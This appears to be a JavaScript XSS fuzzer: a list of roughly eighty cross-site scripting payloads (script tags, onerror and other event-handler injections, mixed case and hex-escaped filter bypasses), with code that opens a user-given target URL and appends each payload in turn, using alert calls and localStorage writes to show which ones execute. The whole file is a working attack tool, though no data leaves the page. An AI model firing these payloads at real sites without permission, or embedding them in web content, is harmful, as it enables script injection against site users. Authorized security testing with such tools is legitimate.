var targetActive=null;
var payload=[
	"<script>{EXEC}</script>",
	"<script>{EXEC}</script>",
	"\"><img src='x' onerror=\"{EXEC}\"/>",
	"\"><img src='x' onerror=\"{EXEC}\"/>",
	"<script>{EXEC}</script>",
	"<ScRipT>{EXEC}</ScRipT>",
	"<script>{EXEC}</script>",
	"<script>{EXEC};alert(\"hellox worldss\");</script>",
	"<script>{EXEC}</script>",
	"<script>{EXEC}alert(“XSS”);</script>",
	"<script>{EXEC}alert(‘XSS’)</script>",
	"“><script>{EXEC}alert(“XSS”)</script>",
	"<script>{EXEC}alert(/XSS”)</script>",
	"<script>{EXEC}alert(/XSS/)</script>",
	"</script><script>{EXEC}alert(1)</script>",
	"‘; {EXEC}alert(1);",
	"‘){EXEC}alert(1);//",
	"<ScRiPt>{EXEC}alert(1)</sCriPt>",
	"<IMG SRC=jAVasCrIPt:{EXEC}alert(‘XSS’)>",
	"<IMG SRC=”javascript:{EXEC}alert(‘XSS’);”>",
	"<IMG SRC=javascript:{EXEC}alert(&quot;XSS&quot;)>",
	"<IMG SRC=javascript:{EXEC}alert(‘XSS’)>",
	"<img src=xss onerror={EXEC}alert(1)>",
	"<script\x20type=\"text/javascript\">javascript:{EXEC}alert(1);</script>",
	"<script\x3Etype=\"text/javascript\">javascript:{EXEC}alert(1);</script>",
	"<script\x0Dtype=\"text/javascript\">javascript:{EXEC}alert(1);</script>",
	"<script\x09type=\"text/javascript\">javascript:{EXEC}alert(1);</script>",
	"<script\x0Ctype=\"text/javascript\">javascript:{EXEC}alert(1);</script>",
	"<script\x2Ftype=\"text/javascript\">javascript:{EXEC}alert(1);</script>",
	"<script\x0Atype=\"text/javascript\">javascript:{EXEC}alert(1);</script>",
	"'`\"><\x3Cscript>javascript:{EXEC}alert(1)</script> ",
	"'`\"><\x00script>javascript:{EXEC}alert(1)</script>",
	"<img src=1 href=1 onerror=\"javascript:{EXEC}alert(1)\"></img>",
	"<audio src=1 href=1 onerror=\"javascript:{EXEC}alert(1)\"></audio>",
	"<video src=1 href=1 onerror=\"javascript:{EXEC}alert(1)\"></video>",
	"<body src=1 href=1 onerror=\"javascript:{EXEC}alert(1)\"></body>",
	"<image src=1 href=1 onerror=\"javascript:{EXEC}alert(1)\"></image>",
	"<object src=1 href=1 onerror=\"javascript:{EXEC}alert(1)\"></object>",
	"<script src=1 href=1 onerror=\"javascript:{EXEC}alert(1)\"></script>",
	"<svg onResize svg onResize=\"javascript:javascript:{EXEC}alert(1)\"></svg onResize>",
	"<title onPropertyChange title onPropertyChange=\"javascript:javascript:{EXEC}alert(1)\"></title onPropertyChange>",
	"<iframe onLoad iframe onLoad=\"javascript:javascript:{EXEC}alert(1)\"></iframe onLoad>",
	"<body onMouseEnter body onMouseEnter=\"javascript:javascript:{EXEC}alert(1)\"></body onMouseEnter>",
	"<body onFocus body onFocus=\"javascript:javascript:{EXEC}alert(1)\"></body onFocus>",
	"<frameset onScroll frameset onScroll=\"javascript:javascript:{EXEC}alert(1)\"></frameset onScroll>",
	"<script onReadyStateChange script onReadyStateChange=\"javascript:javascript:{EXEC}alert(1)\"></script onReadyStateChange>",
	"<html onMouseUp html onMouseUp=\"javascript:javascript:{EXEC}alert(1)\"></html onMouseUp>",
	"<body onPropertyChange body onPropertyChange=\"javascript:javascript:{EXEC}alert(1)\"></body onPropertyChange>",
	"<svg onLoad svg onLoad=\"javascript:javascript:{EXEC}alert(1)\"></svg onLoad>",
	"<body onPageHide body onPageHide=\"javascript:javascript:{EXEC}alert(1)\"></body onPageHide>",
	"<body onMouseOver body onMouseOver=\"javascript:javascript:{EXEC}alert(1)\"></body onMouseOver>",
	"<body onUnload body onUnload=\"javascript:javascript:{EXEC}alert(1)\"></body onUnload>",
	"<body onLoad body onLoad=\"javascript:javascript:{EXEC}alert(1)\"></body onLoad>",
	"<bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:{EXEC}alert(1)\"></bgsound onPropertyChange>",
	"<html onMouseLeave html onMouseLeave=\"javascript:javascript:{EXEC}alert(1)\"></html onMouseLeave>",
	"<html onMouseWheel html onMouseWheel=\"javascript:javascript:{EXEC}alert(1)\"></html onMouseWheel>",
	"<style onLoad style onLoad=\"javascript:javascript:{EXEC}alert(1)\"></style onLoad>",
	"<iframe onReadyStateChange iframe onReadyStateChange=\"javascript:javascript:{EXEC}alert(1)\"></iframe onReadyStateChange>",
	"<body onPageShow body onPageShow=\"javascript:javascript:{EXEC}alert(1)\"></body onPageShow>",
	"<style onReadyStateChange style onReadyStateChange=\"javascript:javascript:{EXEC}alert(1)\"></style onReadyStateChange>",
	"<frameset onFocus frameset onFocus=\"javascript:javascript:{EXEC}alert(1)\"></frameset onFocus>",
	"<applet onError applet onError=\"javascript:javascript:{EXEC}alert(1)\"></applet onError>",
	"<marquee onStart marquee onStart=\"javascript:javascript:{EXEC}alert(1)\"></marquee onStart>",
	"<script onLoad script onLoad=\"javascript:javascript:{EXEC}alert(1)\"></script onLoad>",
	"<html onMouseOver html onMouseOver=\"javascript:javascript:{EXEC}alert(1)\"></html onMouseOver>",
	"<html onMouseEnter html onMouseEnter=\"javascript:parent.javascript:{EXEC}alert(1)\"></html onMouseEnter>",
	"<body onBeforeUnload body onBeforeUnload=\"javascript:javascript:{EXEC}alert(1)\"></body onBeforeUnload>",
	"<html onMouseDown html onMouseDown=\"javascript:javascript:{EXEC}alert(1)\"></html onMouseDown>",
	"<marquee onScroll marquee onScroll=\"javascript:javascript:{EXEC}alert(1)\"></marquee onScroll>",
	"<xml onPropertyChange xml onPropertyChange=\"javascript:javascript:{EXEC}alert(1)\"></xml onPropertyChange>",
	"<frameset onBlur frameset onBlur=\"javascript:javascript:{EXEC}alert(1)\"></frameset onBlur>",
	"<applet onReadyStateChange applet onReadyStateChange=\"javascript:javascript:{EXEC}alert(1)\"></applet onReadyStateChange>",
	"<svg onUnload svg onUnload=\"javascript:javascript:{EXEC}alert(1)\"></svg onUnload>",
	"<html onMouseOut html onMouseOut=\"javascript:javascript:{EXEC}alert(1)\"></html onMouseOut>",
	"<body onMouseMove body onMouseMove=\"javascript:javascript:{EXEC}alert(1)\"></body onMouseMove>",
	"<body onResize body onResize=\"javascript:javascript:{EXEC}alert(1)\"></body onResize>",
	"<object onError object onError=\"javascript:javascript:{EXEC}alert(1)\"></object onError>",
	"<body onPopState body onPopState=\"javascript:javascript:{EXEC}alert(1)\"></body onPopState>",
	"<html onMouseMove html onMouseMove=\"javascript:javascript:{EXEC}alert(1)\"></html onMouseMove>",
	"<applet onreadystatechange applet onreadystatechange=\"javascript:javascript:{EXEC}alert(1)\"></applet onreadystatechange>",
	"<script>/* *\x2A/javascript:{EXEC}alert(1)// */</script>",
	"<script>/* *\x00/javascript:{EXEC}alert(1)// */</script>",
];
var l=payload.length;
var i=0;
function testAlert(url){
	rep=setInterval(runAlertXSS,1500);
	targetActive=window.open(url,'_blank');
	if(targetActive==null){
		return true;
	}
	return false;
}
var res="";
function runAlertXSS(){
	clearInterval(rep);
	rep=setInterval(runAlertXSS,1500);
	target=document.getElementById("target").value;
	if(!(targetActive==null)){
		var exec="localStorage.payload"+i+"+='Ok';alert("+i+");";
		payload[i]=payload[i].replace("{EXEC}",exec);
		testURI=target+payload[i];
		res+=("\n[+]Payload["+i+"]: "+payload[i]).trim();
		res+="\n\n################################\n\n";
		document.getElementById("res").innerHTML+=res;
		targetActive.location.href=testURI;
	}
	if(payload[i]===undefined){
		clearInterval(rep);
	}
	i++;
}
